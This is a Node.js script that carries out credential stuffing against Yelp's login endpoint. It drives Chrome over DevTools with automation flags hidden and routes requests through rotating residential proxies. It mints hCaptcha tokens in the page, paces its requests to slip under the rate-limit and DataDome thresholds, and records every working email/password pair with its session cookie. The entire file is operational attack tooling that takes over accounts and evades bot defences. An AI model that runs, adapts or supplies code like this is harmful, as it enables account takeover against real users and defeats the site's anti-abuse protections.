const http = require('http');
const net = require('net');
const fs = require('fs');
const { spawn } = require('child_process');
const os = require('os');
const path = require('path');

// Fast path: one hydrated page, hCaptcha token minted in-page, POST /login/newajax via fetch.
// Two hard limits drive the pacing:
//   1) ~15 POST / 60 s per IP  -> 429 above that
//   2) ~30 POST per sticky IP  -> 403 (DataDome) from POST 32 onwards
// So: 15 POST per IP, rotate by relaunching Chrome. 15 also sits under the 429 window,
// which means no pacing sleep is needed inside a chunk.
//
// env: BID LIST OUT PU_BASE PW [MAXT] [SITEKEY] [PACE] [BUDGET]
const BID = parseInt(process.env.BID || '0', 10);
const LIST = process.env.LIST, OUT = process.env.OUT;
const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
const MAXT = parseInt(process.env.MAXT || '900000', 10);
const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
const PACE = parseInt(process.env.PACE || '14', 10);      // max POST per rolling minute
const BUDGET = parseInt(process.env.BUDGET || '15', 10);  // max POST per sticky IP

const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SESS = ('f' + BID) + 'z' + Math.floor(Math.random() * 100000);
const PU = PU_BASE + '-sessid-' + SESS + (process.env.PU_SUFFIX || '-sesstime-1800');
const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
const LP = 8986 + BID, CP = 9306 + BID;

const relay = http.createServer((q, s) => {
  try {
    const u = new URL(q.url);
    const pr = http.request({ host: u.hostname, port: u.port || 80, method: q.method, path: u.pathname + u.search, headers: Object.assign({}, q.headers, { host: u.host }) }, r => { s.writeHead(r.statusCode, r.headers); r.pipe(s); });
    pr.on('error', () => s.destroy()); q.pipe(pr);
  } catch (e) { s.destroy(); }
});
relay.on('connect', (req, cs, head) => {
  const sock = net.connect(PP, PH, () => sock.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    sock.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} sock.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    sock.pipe(cs); cs.pipe(sock);
    if (head && head.length) sock.write(head);
    sock.on('error', () => cs.destroy()); cs.on('error', () => sock.destroy());
  }
  sock.on('data', onData);
  sock.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

const sleep = ms => new Promise(r => setTimeout(r, ms));
async function j(u, n) { for (let i = 0; i < n; i++) { try { const r = await fetch(u); return await r.json(); } catch (e) { await sleep(400); } } return null; }
const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
const t0 = Date.now();
// Disk guard: a full temp volume makes Chrome silently stall (ENOSPC), which looks like
// DataDome/hydration failure and destroys throughput. 2 GB is the floor.
(function(){
  try {
    var st = fs.statfsSync(os.tmpdir());
    var freeGB = st.bavail * st.bsize / 1e9;
    if (freeGB < 2) { rec({ event: 'abort', why: 'disk', freeGB: Math.round(freeGB*10)/10 }); process.exit(2); }
  } catch (e) {}
})();
const postTimes = [];   // ms timestamps of every POST sent from this IP
let paceSleepMs = 0;

function paceDelay() {
  const now = Date.now();
  while (postTimes.length && postTimes[0] < now - 60000) postTimes.shift();
  if (postTimes.length >= PACE) {
    const wait = postTimes[0] + 60000 - now + 250;
    return wait > 0 ? wait : 0;
  }
  return 0;
}

(async () => {
  fs.writeFileSync(OUT, '');
  const creds = fs.readFileSync(LIST, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(l => {
    const c = l.indexOf(':'); return { email: l.slice(0, c), pass: l.slice(c + 1) };
  });
  rec({ event: 'start', n: creds.length, sess: SESS, mode: 'fast', pace: PACE, budget: BUDGET });

  await new Promise(r => relay.listen(LP, '127.0.0.1', r));
  const udd = path.join(os.tmpdir(), 'cdp-f' + BID + '-' + Date.now());
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled',
    '--window-size=900,700', '--lang=en-US', '--user-data-dir=' + udd,
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
    'https://www.yelp.com/login/'
  ], { stdio: 'ignore' });

  const ver = await j('http://127.0.0.1:' + CP + '/json/version', 40);
  if (!ver) { rec({ err: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  let id = 0; const pend = new Map();
  ws.addEventListener('message', ev => { let m; try { m = JSON.parse(ev.data); } catch (e) { return; } if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); } });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });
  const sendS = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });

  await sleep(8000);
  const t = await send('Target.getTargets');
  let sid = null;
  if (t && t.result) { const pg = t.result.targetInfos.find(x => x.type === 'page'); if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) sid = a.result.sessionId; } }
  const ev = e => new Promise(resolve => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
    setTimeout(() => resolve(null), 40000);
  });
  await sendS('Page.enable'); await sendS('Network.enable', {});

  let ddok = false;
  for (let k = 0; k < 25; k++) {
    await sleep(2000);
    const s = await ev(`JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);
    try { const o = JSON.parse(s); if (o && o.l > 200000 && /Log In/i.test(o.t || '')) { ddok = true; break; } } catch (e) {}
  }
  rec({ event: 'ddok', ddok });
  if (!ddok) { rec({ event: 'abort', why: 'dd' }); chrome.kill(); relay.close(); return; }

  async function hydrate(rounds) {
    for (let a = 0; a < rounds; a++) {
      await sendS('Page.navigate', { url: 'https://www.yelp.com/login/' });
      for (let k = 0; k < 20; k++) {
        await sleep(1000);
        const s = await ev(`JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length})`);
        try { const o = JSON.parse(s); if (o && o.f && o.h && o.l > 400000) return true; } catch (e) {}
      }
    }
    return false;
  }
  async function armWidget() {
    // A self-rendered widget is fine: same sitekey, token is accepted as long as the
    // field name is hcaptcha_response (underscore). h-captcha-response is ignored.
    return await ev(`(function(){
      if(window.__fcReady) return 'ready:'+window.__wid;
      if(!window.hcaptcha) return 'no-api';
      var c=document.querySelector('[data-hcaptcha-widget-id]');
      if(c && c.getAttribute('data-hcaptcha-widget-id')){
        window.__wid=c.getAttribute('data-hcaptcha-widget-id'); window.__own=false; window.__fcReady=true;
        return 'site:'+window.__wid;
      }
      var d=document.createElement('div'); d.id='__fcap'; d.style.display='none';
      document.body.appendChild(d);
      try { window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible'}); }
      catch(e){ return 'err:'+e.message; }
      window.__own=true; window.__fcReady=true;
      return 'own:'+window.__wid;
    })()`);
  }
  const mint = () => ev(`new Promise(function(res){
    var w=window.__wid;
    if(!w){ res(''); return; }
    var done=false;
    function fin(t){ if(!done){ done=true; res(t||''); } }
    try {
      var ta=document.querySelector('textarea[name=h-captcha-response],input[name=h-captcha-response]');
      if(ta) ta.value='';
      window.hcaptcha.execute(w);
    } catch(e){ fin(''); return; }
    var n=0;
    var iv=setInterval(function(){
      n++;
      var t='';
      try { t=window.hcaptcha.getResponse(w)||''; } catch(e){}
      if(!t){ var el=document.querySelector('textarea[name=h-captcha-response],input[name=h-captcha-response]'); if(el) t=el.value||''; }
      if(t){ clearInterval(iv); fin(t); }
      else if(n>160){ clearInterval(iv); fin(''); }
    },150);
  })`);

  // hydration is retried; widget absence is not retried here (see armWidget)
  let ok = await hydrate(4);
  rec({ event: 'hydrated', ok });
  if (!ok) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }

  const armed = await armWidget();
  rec({ event: 'widget', armed });
  if (String(armed).startsWith('err') || armed === 'no-api') { rec({ event: 'abort', why: 'widget' }); chrome.kill(); relay.close(); return; }
  // A self-rendered widget has no site rqdata. Since 2026-11-20 Yelp answers such tokens with a magic link
  // instead of a verdict, so the whole chunk is wasted unless the submit path is used. Fail closed.
  const ownWidget = String(armed).startsWith('own');
  if (ownWidget && process.env.ALLOW_OWN !== '1') { rec({ event: 'abort', why: 'widget-own' }); chrome.kill(); relay.close(); return; }

  let csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
  rec({ event: 'csrf', len: (csrf || '').length });

  let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, r407 = 0, tokFail = 0, posted = 0;
  const successes = [], msAll = [], tokAll = [], postAll = [];
  let blocked = false;

  for (let i = 0; i < creds.length && !blocked; i++) {
    if (Date.now() - t0 > MAXT) { rec({ event: 'timecap', at: i }); break; }
    if (posted >= BUDGET) { rec({ event: 'budget', at: i, posted }); break; }
    const c = creds[i];
    let fin = false;

    for (let att = 0; att < 3 && !fin && !blocked; att++) {
      const wait = paceDelay();
      if (wait > 0) { paceSleepMs += wait; await sleep(wait); }

      const tt = Date.now();
      const tok = await mint();
      const tokMs = Date.now() - tt;
      if (!tok) tokFail++;

      const tp = Date.now();
      postTimes.push(Date.now());
      posted++;
      const raw = await ev(`(async function(){
        var b=new URLSearchParams();
        b.set('csrftok', ${JSON.stringify(csrf)});
        b.set('email', ${JSON.stringify(c.email)});
        b.set('password', ${JSON.stringify(c.pass)});
        b.set('hcaptcha_response', ${JSON.stringify(String(tok || ''))});
        try {
          var r=await fetch('/login/newajax',{method:'POST',credentials:'include',
            headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},
            body:b.toString()});
          return JSON.stringify({status:r.status, body:(await r.text()).slice(0,600)});
        } catch(e){ return JSON.stringify({status:-1, body:'fetch:'+e.message}); }
      })()`);
      const postMs = Date.now() - tp;
      msAll.push(tokMs + postMs); tokAll.push(tokMs); postAll.push(postMs);

      let r = {}; try { r = JSON.parse(raw || '{}'); } catch (e) {}
      let js = null; try { js = JSON.parse(r.body || 'null'); } catch (e) {}

      if (r.status === 429) { r429++; rec({ event: 'r429', at: i + 1, posted }); await sleep(13000); continue; }
      if (r.status === 403 || r.status === 407) {
        if (r.status === 403) r403++; else r407++;
        rec({ event: r.status === 403 ? 'r403' : 'r407', at: i + 1, posted, body: (r.body || '').slice(0, 60) });
        blocked = true;
        break;
      }

      const text = (js && (js.errors || []).join(' ')) || (r.body || '');
      const isSuccess = !!(js && js.success === true);
      const isClosed = /has been closed/i.test(text);
      const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test(text));
      const isUnable = /unable to log you in/i.test(text);
      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess) || /login link|magic link/i.test(text);

      if (isSuccess) success++; else if (isClosed) closed++; else if (isInvalid) validated++;
      else if (isUnable) unable++; else if (isLink) link++; else unknown++;

      let profileStatus = null, zss = null;
      if (isSuccess) {
        await sleep(2000);
        profileStatus = await ev(`(async()=>{ try { const r=await fetch('/profile',{credentials:'include'}); return r.status; } catch(e){ return -1; } })()`);
        const ck = await sendS('Network.getAllCookies', {});
        const all = (ck && ck.result && ck.result.cookies) || [];
        zss = all.filter(x => x.name === 'zss').map(x => ({ d: x.domain, len: (x.value || '').length }));
        successes.push({ email: c.email, pass: c.pass, profileStatus, zss });
      }
      const zssLen = zss && zss.length ? Math.max(...zss.map(x => x.len)) : 0;
      rec({ i: i + 1, email: c.email, pass: c.pass, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, zssLen, ms: tokMs + postMs });
      fin = true;

      if (isSuccess) {
        await sendS('Page.navigate', { url: 'https://www.yelp.com/logout?return_url=%2Flogin%2F' });
        await sleep(4000);
        const h = await hydrate(3);
        if (!h) { rec({ event: 'rehydrate_fail', at: i + 1 }); blocked = true; break; }
        csrf = await ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
        await armWidget();
      }
    }
  }

  const avg = a => a.length ? Math.round(a.reduce((x, y) => x + y, 0) / a.length) : 0;
  rec({ event: 'summary', mode: 'fast', armed, ownWidget, processed: msAll.length, posted, validated, success, unable, link, closed, unknown,
        r429, r403, r407, tokFail, blocked, paceSleepMs, avgTokMs: avg(tokAll), avgPostMs: avg(postAll), avgMs: avg(msAll),
        secs: Math.round((Date.now() - t0) / 1000), successes });

  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  try { relay.close(); } catch (e) {}
  setTimeout(() => process.exit(0), 800);
})();


